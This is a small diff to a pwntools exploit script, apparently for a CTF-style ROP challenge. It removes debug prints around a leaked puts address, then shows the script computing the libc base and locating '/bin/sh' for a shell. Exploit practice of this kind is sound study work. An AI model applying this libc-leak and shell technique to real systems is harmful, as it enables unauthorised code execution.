@@ -113,10 +113,7 @@ leaked_string = p.recvuntil("\ncallme")
 received = leaked_string.replace(b"Thank you!\n", b"")
 received = received.replace(b"\ncallme", b"")
 leaked_addr = u64(received.ljust(8, b"\x00"))
-print("--- leak BEGIN ---")
-print(hex(leaked_addr))
-print("--- leak END ---")
-libc.address = leaked_addr - libc.symbols["puts"] # calculate libc base: base = current_process_puts - offset_of_puts_from_base
+libc.address = leaked_addr - libc.symbols["puts"]
 print("libc base @ %s" % hex(libc.address))
 
 bin_sh = next(libc.search(b"/bin/sh"))
